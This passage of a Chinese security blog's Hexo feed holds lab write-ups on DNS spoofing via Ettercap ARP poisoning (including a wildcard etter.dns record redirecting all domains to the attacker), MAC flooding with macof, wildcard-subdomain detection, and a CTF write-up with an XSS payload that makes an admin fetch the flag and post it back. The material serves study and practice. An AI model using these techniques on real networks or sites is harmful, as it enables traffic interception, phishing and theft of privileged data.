class="built_in">printf</span>(“syscall(SYS_getpid)=%ld\n”, ID1);</span><br><span class="line">ID2=getpid();                <span class="comment">/*使用libc封装的隐式系统调用*/</span></span><br><span class="line"><span class="built_in">printf</span>(“getpid()=%ld\n”, ID2);</span><br><span class="line"> <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dns欺骗</title>
      <link href="/2024/11/05/dns%E6%AC%BA%E9%AA%97/"/>
      <url>/2024/11/05/dns%E6%AC%BA%E9%AA%97/</url>
      
        <content type="html"><![CDATA[<p>[[Ettercap]] 少不了这个 arp 毒化和流量截取的中间人工具。</p><h4 id="dns欺骗原理"><a href="#dns欺骗原理" class="headerlink" title="dns欺骗原理"></a>dns欺骗原理</h4><h5 id="什么是-DNS-欺骗？"><a href="#什么是-DNS-欺骗？" class="headerlink" title="什么是 DNS 欺骗？"></a>什么是 DNS 欺骗？</h5><p><strong>DNS 欺骗（DNS Spoofing）</strong> 是一种网络攻击技术，攻击者通过修改 DNS 响应，将目标用户的 DNS 查询结果篡改，指向攻击者控制的服务器。DNS 是域名解析服务的缩写，它将用户输入的域名（例如 <code>www.example.com</code>）转化为与之对应的 IP 地址（例如 <code>192.168.1.1</code>）。如果攻击者能控制 DNS 响应，就能让用户访问到攻击者伪造的服务器，而不是正确的目标服务器。</p><h5 id="Ettercap-和-DNS-欺骗-的作用"><a href="#Ettercap-和-DNS-欺骗-的作用" class="headerlink" title="Ettercap 和 DNS 欺骗 的作用"></a><strong>Ettercap</strong> 和 <strong>DNS 欺骗</strong> 的作用</h5><p><strong>Ettercap</strong> 是一款强大的网络嗅探和中间人攻击工具，它支持多种攻击方式，包括 <strong>ARP 欺骗</strong>、<strong>DNS 欺骗</strong>、<strong>流量注入</strong>等。我们现在关注的是 <strong>DNS 欺骗</strong>，这是通过以下几个步骤实现的。</p><h5 id="1-ARP-欺骗（ARP-Spoofing）"><a href="#1-ARP-欺骗（ARP-Spoofing）" class="headerlink" title="1. ARP 欺骗（ARP Spoofing）"></a>1. <strong>ARP 欺骗（ARP Spoofing）</strong></h5><p>DNS 欺骗本身并不是一个独立的攻击行为，而是通常与 <strong>ARP 欺骗</strong> 配合使用的。要理解这个过程，我们需要先了解什么是 <strong>ARP（地址解析协议）</strong>。</p><ul><li><strong>ARP（Address Resolution Protocol）</strong> 用于在局域网内根据设备的 IP 地址找到其对应的 MAC 地址。</li><li>在局域网中，设备之间的通信是通过 <strong>MAC 地址</strong> 来标识的，但当你要发送数据时，需要知道目标设备的 <strong>IP 地址</strong> 和 <strong>MAC 地址</strong>。</li><li><strong>ARP 欺骗</strong> 是通过发送伪造的 ARP 包，告诉网络中的其他设备：<strong>“我是你们要与之通信的目标（例如网关或某台设备），所以你们应该将数据发送到我这里。”</strong></li></ul><p>通过 <strong>ARP 欺骗</strong>，攻击者可以让流量流经自己的计算机，成为中间人。</p><h5 id="2-DNS-欺骗的实现"><a href="#2-DNS-欺骗的实现" class="headerlink" title="2. DNS 欺骗的实现"></a>2. <strong>DNS 欺骗的实现</strong></h5><p>一旦使用 ARP 欺骗使得攻击者处于目标与目标网关之间（即中间人位置），接下来的步骤就是 DNS 欺骗。这个步骤的基本流程如下：</p><ul><li>目标机器通过 <strong>ARP 欺骗</strong> 将其网络流量重定向到攻击者计算机。</li><li>当目标机器发出 DNS 请求时，攻击者会截获该请求，并返回伪造的 DNS 响应。</li><li>例如，目标机器可能请求解析 <code>www.example.com</code> 的 IP 地址。攻击者通过 Ettercap 或其他工具返回一个伪造的 IP 地址（比如攻击者自己的 IP 地址）作为 DNS 响应。</li></ul><h5 id="3-Ettercap-如何实现-DNS-欺骗"><a href="#3-Ettercap-如何实现-DNS-欺骗" class="headerlink" title="3. Ettercap 如何实现 DNS 欺骗"></a>3. <strong>Ettercap 如何实现 DNS 欺骗</strong></h5><p>Ettercap 通过嗅探网络流量并劫持 DNS 请求，向目标返回伪造的 DNS 响应来实现 DNS 欺骗。以下是该过程的具体工作方式：</p><ul><li><strong>嗅探和中间人攻击</strong>：攻击者使用 ARP 欺骗将自己置于目标和目标网关之间，使得所有流量都通过攻击者的计算机。此时，攻击者成为中间人。</li><li><strong>DNS 请求拦截</strong>：当目标设备发起 DNS 查询时（例如查询 <code>www.example.com</code>），这些请求会通过攻击者的机器发送。</li><li><strong>DNS 响应伪造</strong>：攻击者通过配置 Ettercap 工具，在 <code>etter.dns</code> 配置文件中指定伪造的 DNS 解析结果（例如将 <code>www.example.com</code> 指向攻击者的 IP 地址）。然后，Ettercap 将伪造的 DNS 响应发送给目标。</li><li><strong>目标访问攻击者的伪造服务器</strong>：目标机器收到伪造的 DNS 响应后，会尝试访问被篡改的 IP 地址，通常是攻击者的计算机，从而将受害者引导到攻击者控制的站点或服务器。</li></ul><h5 id="4-Ettercap-中-DNS-欺骗的配置"><a href="#4-Ettercap-中-DNS-欺骗的配置" class="headerlink" title="4. Ettercap 中 DNS 欺骗的配置"></a>4. <strong>Ettercap 中 DNS 欺骗的配置</strong></h5><p>在 Ettercap 中，你可以通过配置 <code>etter.dns</code> 文件来指定 DNS 欺骗的行为。这个配置文件包含了伪造的 DNS 记录，比如：</p><p>plaintext</p><p><code>* A 192.168.197.193   # 将所有域名解析为攻击者的 IP 地址 * PTR 192.168.197.193 # 反向解析，确保所有指向攻击者 IP 的域名都被正确解析</code></p><p>通过这种方式，Ettercap 在执行中间人攻击时能够篡改所有 DNS 请求的响应，将目标请求重定向到攻击者指定的服务器（通常是攻击者自己的 IP 地址）。</p><h5 id="5-实际应用中的攻击效果"><a href="#5-实际应用中的攻击效果" class="headerlink" title="5. 实际应用中的攻击效果"></a>5. <strong>实际应用中的攻击效果</strong></h5><p>DNS 欺骗可以被用来进行多种攻击，包括：</p><ul><li><strong>钓鱼攻击</strong>：将目标用户引导到一个伪造的网站（例如伪造银行网站），以获取用户的登录凭据。</li><li><strong>流量窃取</strong>：通过将目标设备指向一个恶意的 DNS 服务器，攻击者可以窃取用户的流量。</li><li><strong>拒绝服务攻击（DoS）</strong>：将目标设备的 DNS 查询指向一个不存在的或无法响应的 IP 地址，导致目标无法访问网站</li></ul><h5 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h5><p>一般来讲arp 欺骗只能在局域网中使用 ，同时dns欺骗不一定只能在局域网中，因为我们还可以拿到路由器的权限之后就可以截获多个网络的dns解析请求，从而实现中间人攻击返回dns解析响应。</p><h5 id="正向和反向解析"><a href="#正向和反向解析" class="headerlink" title="正向和反向解析"></a>正向和反向解析</h5><p>在 DNS 欺骗中，<strong>正向解析</strong>（Forward Lookup）和 <strong>反向解析</strong>（Reverse Lookup）都有特定的配置目的，这两种解析方式通过不同的方式影响网络通信的行为。具体来说，在使用 <strong>Ettercap</strong> 进行 DNS 欺骗时，正向解析和反向解析的配置非常重要，下面我来详细解释这两者的作用和配置原因。</p><h6 id="1-正向解析（Forward-Lookup）"><a href="#1-正向解析（Forward-Lookup）" class="headerlink" title="1. 正向解析（Forward Lookup）"></a>1. <strong>正向解析（Forward Lookup）</strong></h6><p>正向解析是 DNS 的常规操作，即将 <strong>域名</strong> 转换为 <strong>IP 地址</strong>。</p><ul><li><strong>例子</strong>：当你在浏览器中输入 <code>www.example.com</code> 时，浏览器会通过 DNS 查询 <code>www.example.com</code> 对应的 IP 地址。DNS 服务将返回一个 IP 地址（比如 <code>93.184.216.34</code>），然后浏览器使用这个 IP 地址与服务器建立连接。</li></ul><p>在 DNS 欺骗中，正向解析的配置通常用于：</p><ul><li><strong>将域名指向攻击者的 IP 地址</strong>：假设目标要访问的是 <code>www.example.com</code>，攻击者可以将该域名的解析结果伪造为攻击者的 IP 地址。这样，当受害者查询 <code>www.example.com</code> 时，返回的并不是正确的服务器 IP，而是攻击者的服务器或计算机的 IP 地址。</li></ul><p>例如，在 Ettercap 的配置文件 <code>etter.dns</code> 中，正向解析可能看起来是这样的：</p><p><code>www.example.com A 192.168.197.193   # 将 www.example.com 解析为攻击者的 IP 地址</code></p><p>这里 <code>www.example.com</code> 的 A 记录将指向攻击者的 IP 地址 <code>192.168.197.193</code>，这就使得任何访问 <code>www.example.com</code> 的目标设备都会被重定向到攻击者的机器。</p><h6 id="2-反向解析（Reverse-Lookup）"><a href="#2-反向解析（Reverse-Lookup）" class="headerlink" title="2. 反向解析（Reverse Lookup）"></a>2. <strong>反向解析（Reverse Lookup）</strong></h6><p>反向解析是指将 <strong>IP 地址</strong> 转换为 <strong>域名</strong>。这通常是通过 <strong>PTR 记录</strong>（Pointer Record）实现的。</p><ul><li><strong>例子</strong>：假设某个网站的服务器 IP 地址是 <code>93.184.216.34</code>，你可以进行反向 DNS 查询，获取该 IP 地址对应的域名（比如 <code>example.com</code>）。</li></ul><p>反向解析在 DNS 欺骗中的作用是，确保当目标设备试图进行反向 DNS 查询时，返回的域名是合理的，避免因域名与 IP 地址不匹配而引起怀疑。</p><h6 id="3-为什么正向解析和反向解析都要配置？"><a href="#3-为什么正向解析和反向解析都要配置？" class="headerlink" title="3. 为什么正向解析和反向解析都要配置？"></a>3. <strong>为什么正向解析和反向解析都要配置？</strong></h6><p>在进行 DNS 欺骗时，攻击者往往不仅想要将目标用户的请求重定向到攻击者控制的服务器，还希望这些伪造的 DNS 解析结果看起来是可信的。为此，正向解析和反向解析都需要被配置，以达到以下效果</p><p>解析实操配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">反向解析配置</span></span><br><span class="line">100.1.168.192.in-addr.arpa PTR www.example.com</span><br><span class="line">101.1.168.192.in-addr.arpa PTR ftp.example.com</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">正向解析配置</span></span><br><span class="line">www.example.com A 192.168.1.100</span><br><span class="line">ftp.example.com A 192.168.1.101</span><br></pre></td></tr></table></figure><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><h5 id="实验机器"><a href="#实验机器" class="headerlink" title="实验机器"></a>实验机器</h5><p><strong>操作系统</strong>：Kali Linux（攻击机）和 Windows&#x2F;Linux（目标机）在同一局域网内。<br><strong>工具</strong>：Ettercap、Apache（在Kali上运行一个伪造的Web服务）。<br><strong>网络配置</strong>：攻击机与目标机同处一个子网，Kali具备足够权限（需要 root 权限）。</p><p>其实简单说一下就是，我们保证实验环境我们在一个局域网，同时我们利用操作进行arp毒化，使得我们的kali充当路由器的功能，之后截取受害者dns解析流量，然后解析成我们的ip，使得他返回我们的攻击ip。</p><ol><li>钓鱼</li><li>截取流量，捕获局域网内相关流量</li></ol><h5 id="arp欺骗"><a href="#arp欺骗" class="headerlink" title="arp欺骗"></a>arp欺骗</h5><p>网关192.168.234.235<br>接下来使用ettercap 进行arp毒化</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> ettercap -G </span><br><span class="line">启动</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241105202402.png" alt="image.png"></p><h5 id="伪造网关和受害者机器"><a href="#伪造网关和受害者机器" class="headerlink" title=". 伪造网关和受害者机器"></a>. 伪造网关和受害者机器</h5><p>如果你只伪造了网关（比如通过 ARP 中毒将网关的 IP 地址与攻击者的 MAC 地址绑定），这样一来，所有<strong>发往外部网络</strong>的流量（即目标主机想要访问互联网或其他网络的流量）就会流向你的设备。也就是说：</p><ul><li>目标主机想通过网关访问外部网络时，会把数据包发给你的设备（因为它误认为你的设备是网关）。</li><li>你可以读取、修改这些流量，甚至将它们转发给真实网关，从而完成 Man-in-the-Middle 攻击。</li></ul><p>但是，仅仅伪造网关并不能拦截从目标主机到网关的<strong>反向流量</strong>，因为：</p><ul><li>网关会将数据包发往目标主机，但网关的 ARP 表中依然会保留目标主机的真实 MAC 地址。</li><li>目标主机并没有修改 ARP 表，它仍然认为网关的 MAC 地址是正常的。</li></ul><p>所以，仅仅伪造网关不会影响目标主机和网关之间的流量反向传输。为了拦截完整的流量，你需要同时伪造目标主机的 ARP 表，让网关也误认为攻击者是目标主机。</p><h5 id="2-伪造网关和目标主机的-ARP-表："><a href="#2-伪造网关和目标主机的-ARP-表：" class="headerlink" title="2. 伪造网关和目标主机的 ARP 表："></a>2. <strong>伪造网关和目标主机的 ARP 表</strong>：</h5><p>为了拦截整个网络流量，攻击者需要同时对<strong>两个方向</strong>的 ARP 表进行修改：</p><ul><li><strong>目标主机：</strong> 使目标主机误认为攻击者的 MAC 地址是网关的 MAC 地址。这样，目标主机将会把发往网关的数据包发送到攻击者，而不是实际的网关。</li><li><strong>网关：</strong> 使网关误认为攻击者的 MAC 地址是目标主机的 MAC 地址。这样，网关将数据包发送给攻击者，而不是目标主机。</li></ul><p>这样，<strong>两条数据流都经过攻击者的设备</strong>：</p><ul><li>目标主机发往网关的流量会先经过攻击者。</li><li>网关发往目标主机的流量也会经过攻击者。</li></ul><p>这种操作实现了<strong>双向拦截</strong>，保证了流量的完整性。如果你只伪造网关，可能只有目标主机发往外部的流量会经过你，但如果目标主机和网关的反向通信不经过你，攻击的效果就会受到限制。</p><p><strong>Kali设置网络转发：echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip forward</strong><br>因为默认不开启，只有开启了之后才能在不同接口转发流量。一般来讲因为kali需要充当路由器所以必须开。</p><h5 id="设置配置文件"><a href="#设置配置文件" class="headerlink" title="设置配置文件"></a>设置配置文件</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ettercap/etter.dns</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241105204243.png" alt="image.png"><br>开始dns毒化</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241105204732.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241105205945.png" alt="image.png"></p><p>可以看到已经启动了</p><p>但是记得删除 解析记录</p><p>Windows查看dns缓存命令：ipconfig &#x2F;displaydns;</p><p>清理dns缓存命令：ipconfig &#x2F;flushdns</p>]]></content>
      
      
      <categories>
          
          <category> 攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac_泛洪</title>
      <link href="/2024/11/05/mac-%E6%B3%9B%E6%B4%AA/"/>
      <url>/2024/11/05/mac-%E6%B3%9B%E6%B4%AA/</url>
      
        <content type="html"><![CDATA[<h4 id="泛洪攻击的类型"><a href="#泛洪攻击的类型" class="headerlink" title="泛洪攻击的类型"></a>泛洪攻击的类型</h4><ol><li><p><strong>TCP SYN Flood</strong>：</p><ul><li>攻击者向目标服务器发送大量的 TCP SYN 请求，但不完成握手过程。服务器为每个请求分配资源，最终可能耗尽其连接表，导致无法处理正常请求。</li></ul></li><li><p><strong>UDP Flood</strong>：</p><ul><li>攻击者向目标发送大量的 UDP 数据包，通常使用随机端口号。目标接收到这些数据包后，会尝试响应，但由于请求量过大，最终会消耗带宽和处理能力。</li></ul></li><li><p><strong>ICMP Flood（Ping Flood）</strong>：</p><ul><li>攻击者发送大量 ICMP 回显请求（Ping），目标服务器需要处理这些请求并发送回显应答，导致其资源被耗尽。</li></ul></li><li><p><strong>HTTP Flood</strong>：</p><ul><li>攻击者发送大量的 HTTP 请求（例如，通过伪造的浏览器请求），使得 Web 服务器无法处理正常用户的请求，导致服务中断。</li></ul></li><li><p><strong>MAC Flood</strong></p></li></ol><h4 id="MAC-Flood"><a href="#MAC-Flood" class="headerlink" title="MAC Flood"></a>MAC Flood</h4><h5 id="交换机的-MAC-地址表工作原理"><a href="#交换机的-MAC-地址表工作原理" class="headerlink" title="交换机的 MAC 地址表工作原理"></a>交换机的 MAC 地址表工作原理</h5><ol><li><strong>学习阶段</strong>：<ul><li>当交换机接收到一个数据帧时，它会查看源 MAC 地址，并将该地址与接收该帧的端口记录到 MAC 地址表中。</li></ul></li><li><strong>转发阶段</strong>：    <ul><li>如果交换机的 MAC 地址表中有目标 MAC 地址，它会将数据帧转发到对应的端口；如果没有，就会进行广播。</li></ul></li><li><strong>老化机制</strong>：<ul><li>为了保持 MAC 地址表的有效性，交换机会定期检查并删除长时间未使用的 MAC 地址。这称为老化（aging）</li></ul></li></ol><h6 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式:"></a>攻击方式:</h6><ol><li><p><strong>占满 MAC 地址表</strong>：</p><ul><li>攻击者通过工具（如 <code>macof</code>）发送大量伪造的以太网帧，每个帧使用不同的源 MAC 地址。这样做的目的是快速填满交换机的 MAC 地址表。</li></ul></li><li><p><strong>MAC 地址表溢出</strong>：</p><ul><li>当 MAC 地址表被填满后，交换机将无法再学习新的 MAC 地址。此时，交换机会将收到的数据帧广播到所有端口，而不是根据 MAC 地址转发。</li></ul></li><li><p><strong>导致广播风暴</strong>：</p><ul><li>由于广播数据帧会发送到所有端口，网络中流量会显著增加，导致拥塞和延迟。合法用户的流量可能被干扰，网络性能下降。</li></ul></li><li><p><strong>影响网络安全</strong>：</p><ul><li>攻击者可以利用广播的特性监听通过网络传输的所有数据，进一步实施其他攻击，比如嗅探数据包。</li></ul></li></ol><h5 id="攻击方式-1"><a href="#攻击方式-1" class="headerlink" title="攻击方式"></a>攻击方式</h5><p>macof进行攻击 ，一般都是在打的都是局域网交换机。 主要是他会模拟多台设备访问mac表。</p><ol><li><p><strong>无线接入点（AP）</strong>：无线网络中的接入点负责处理设备之间的流量。尽管没有物理交换机，但 AP 仍然会维护一个 MAC 地址表，用于确定数据包应该发送到哪个设备。</p></li><li><p><strong>MAC 泛洪攻击</strong>：即使在无线网络中，使用 <code>macof</code> 等工具进行 MAC 泛洪攻击仍然可以导致 AP 的 MAC 地址表溢出，从而使得流量被广播到所有连接的设备。这会影响到所有连接在同一热点上的设备。</p></li></ol><h5 id="mac防御"><a href="#mac防御" class="headerlink" title="mac防御"></a>mac防御</h5><p>是的，使用静态 MAC 转发表可以有效减少广播的发生。在静态 MAC 转发表中，交换机只知道那些手动配置的 MAC 地址，因此不会因为接收到未知的 MAC 地址而发送广播。</p><h6 id="具体影响如下："><a href="#具体影响如下：" class="headerlink" title="具体影响如下："></a>具体影响如下：</h6><ol><li><p><strong>减少广播域的大小</strong>：由于交换机只处理已知的静态 MAC 地址，任何未知地址的流量不会引发广播，从而减少了广播风暴的可能性。</p></li><li><p><strong>提高网络性能</strong>：减少广播流量有助于提高网络的整体性能和响应速度，因为交换机不再需要处理大量无效的广播包。</p></li><li><p><strong>增强安全性</strong>：静态配置的 MAC 地址表可以防止攻击者通过伪造 MAC 地址进行网络攻击，从而降低了网络被滥用的风险</p></li></ol><h4 id="防守策略"><a href="#防守策略" class="headerlink" title="防守策略"></a>防守策略</h4><ol><li><p><strong>流量监测与分析</strong>：</p><ul><li>使用流量监测工具检测异常流量模式，及时识别攻击行为。</li></ul></li><li><p><strong>流量限制</strong>：</p><ul><li>对每个 IP 地址的请求数量进行限制，减少恶意请求的影响。</li></ul></li><li><p><strong>防火墙与入侵检测系统（IDS）</strong>：</p><ul><li>部署防火墙和 IDS，可以识别并阻止恶意流量。</li></ul></li><li><p><strong>负载均衡</strong>：</p><ul><li>使用负载均衡技术分散流量，将请求分散到多个服务器上，降低单个服务器的压力。</li></ul></li><li><p><strong>黑名单&#x2F;白名单策略</strong>：</p><ul><li>根据流量来源设置黑名单或白名单，限制不明或可疑的 IP 地址</li></ul></li></ol><h4 id="MAC泛洪攻击实验"><a href="#MAC泛洪攻击实验" class="headerlink" title="MAC泛洪攻击实验"></a>MAC泛洪攻击实验</h4><ol><li>建立网络拓扑<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241104202636.png" alt="image.png"></li></ol><p>简单解释一下，我们利用云开了两个端口，我用的桥接网卡将ip设置为 192.168.234.22<br>加入到了我们局域网中<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241104202726.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241104202926.png" alt="image.png"></p><p>由于我们需要mac泛洪攻击就是，填充mac表因此先清空mac表。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sy </span><br><span class="line">display mac-address</span><br><span class="line">undo    mac-address</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241104203134.png" alt="image.png"></p><p>开始泛洪攻击</p><ul><li>占用资源，使得局域网内部通信变慢</li><li>嗅探局域网内部信息</li></ul><p>因此我们是使用刚才的client 和server 进行模拟正常用户正常流量通过，之后我们利用泛洪攻击针对于数据进行嗅探。<br>在Kali Linux中安装 <code>macof</code>（通常作为 <code>dsniff</code> 套件的一部分）</p><h5 id="PS-mac泛洪只能在局域网"><a href="#PS-mac泛洪只能在局域网" class="headerlink" title="PS mac泛洪只能在局域网"></a>PS mac泛洪只能在局域网</h5><p>网络隔离：路由器设计的目的就是将不同的网络隔离开来，广播帧不会跨越路由器。因此，虽然你可以通过路由器访问另一个局域网，但MAC地址泛洪攻击需要在同一个局域网内部进行，而不是跨网络。</p><p>数据链路层的限制：在数据链路层，MAC地址是局域网内使用的。即使你通过路由器连接到另一个局域网，你的MAC帧依然是基于你的本地网络环境发送的，不会影响目标局域网的交换机。</p><p>防火墙和安全机制：现代网络通常会配置防火墙和其他安全机制来防止未经授权的访问。这些机制会限制对内部网络的访问，进一步阻碍了通过路由器进行MAC泛洪攻击的可能性。</p><h5 id="ftp文件传输"><a href="#ftp文件传输" class="headerlink" title="ftp文件传输"></a>ftp文件传输</h5><p>模拟正常用户文件传输<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241104205736.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241104212139.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241104212150.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>子域名泛解析解析</title>
      <link href="/2024/11/04/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%B3%9B%E8%A7%A3%E6%9E%90%E8%A7%A3%E6%9E%90/"/>
      <url>/2024/11/04/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%B3%9B%E8%A7%A3%E6%9E%90%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h6 id="子域名泛解析的成因"><a href="#子域名泛解析的成因" class="headerlink" title="子域名泛解析的成因"></a>子域名泛解析的成因</h6><p>  在子域名解析中，每个子域名都会解析为一个特定的IP地址。只有被设置解析，用户才能正常进行访问。<br>  一旦用户输入错误的子域名，就会造成无法访问。<br>  在网站运营中，域名持有者为了避免因为错误输入，而造成用户流失，就会使用泛域名解析。<br>  泛域名解析是一种特殊的域名解析方式。它使用通配符形式，设置域名解析。<br>  它可以将没有明确设置的子域名一律解析到一个IP地址上。这样，即使用户输入错误的子域名，也可以访问到域名持有者指定的IP地址。<br>  但是信息收集中，这会造成请求的所有子域名都能访问的假象，从而收集到一堆无效的子域名。</p><p>其实最主要还是因为，在子域名收集中怕在进行子域名收集时候找到很多错误的子域名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">泛域名解析是：*.域名解析到同一IP</span><br><span class="line">域名解析是：子域名.域名解析到同一IP</span><br></pre></td></tr></table></figure><p>但我觉得一般是三级域名，对应的如果说有这个资产那么你输入shop.example.com 可能就会解析对应ip 但是他也有泛解析，你输入一个复杂的泛解析他也会解析识别 。</p><h4 id="判断是否是泛解析"><a href="#判断是否是泛解析" class="headerlink" title="判断是否是泛解析"></a>判断是否是泛解析</h4><p>　  这里以淘宝和百度为例子:ping 一个绝对随机不可能存在的域名,他解析了,那么说明他大概率使用了泛解析</p><p><img src="https://img2022.cnblogs.com/blog/1090320/202203/1090320-20220303113103812-1435020700.png">针对百度,我们可以直接使用layer子域名挖掘机等子域名爆破工具,而针对淘宝的资产,我们不能使用layer子域名挖掘机等常规工具</p><h4 id="解决方式"><a href="#解决方式" class="headerlink" title="解决方式"></a>解决方式</h4><p>1、先获取一个肯定不存在的子域名，并解析其获取其ip，记为ip-A。然后爆破获取到的域名均进行解析获取ip，记为ip-B，与ip-A进行对比，不一致则可判定为真实存在的子域名。</p><p>2、比对响应TTL值，比对过程同上，不一致则为真实存在的子域名。</p><p>这种方式 可以完美的解决对应的收集到的垃圾域名问题。通过对比一定解析错误的ip或者ttl值我们可以看到哪些域名是真的，哪些域名是因为泛解析是假的。</p>]]></content>
      
      
      <categories>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024网鼎杯青龙组</title>
      <link href="/2024/10/30/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84/"/>
      <url>/2024/10/30/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><p>具体flag放入github中</p><p><a href="https://github.com/k1t0111/Ctf-AWD/tree/k1t0111-wdflag2024-1">https://github.com/k1t0111/Ctf-AWD/tree/k1t0111-wdflag2024-1</a> </p><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p>可以看到首先随便一个登陆页面进去，进到飞机管理清单后台。然后发现了两处功能点。</p><ul><li>首先写一个清单，作为飞机起飞列表 </li><li>提交清单</li></ul><p><em><strong>思路:</strong></em></p><ol><li>清单提交可以触发xss </li><li>使用前端xss 代码提交给boss然后在boss地方触发</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&#x27;flag&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">.<span class="title function_">then</span>(<span class="function"><span class="params">response</span>=&gt;</span>response.<span class="title function_">text</span>())</span></span><br><span class="line"><span class="language-javascript">.<span class="title function_">then</span>(<span class="function"><span class="params">data</span>=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">fetch</span>(<span class="string">&#x27;/content/a93770ea93dc1f6a2b9d917b62d29db4&#x27;</span>,&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">method</span>:<span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">body</span>:<span class="string">&quot;content=abc&quot;</span>+<span class="title function_">encodeURLComponent</span>(data),</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">headers</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">   <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript">&#125;) </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>主体大意就是，因为尝试了boss是无法出网的因此我们使用js，使用boss的cookie 去访问flag。<br>然后把内容放在data中。同时继续访问另外一个文件将data内容作为post参数传递进去。然后修改hash文件的内容。我们再去访问hash就可以直接访问到flag。</p><p><strong>总结</strong>最主要还是因为不出网络，因此我们拿不到cookie，因此想到了js功能，让boss自己去访问flag带出flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯模拟赛</title>
      <link href="/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%A8%A1%E6%8B%9F%E8%B5%9B/"/>
      <url>/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%A8%A1%E6%8B%9F%E8%B5%9B/</url>
      
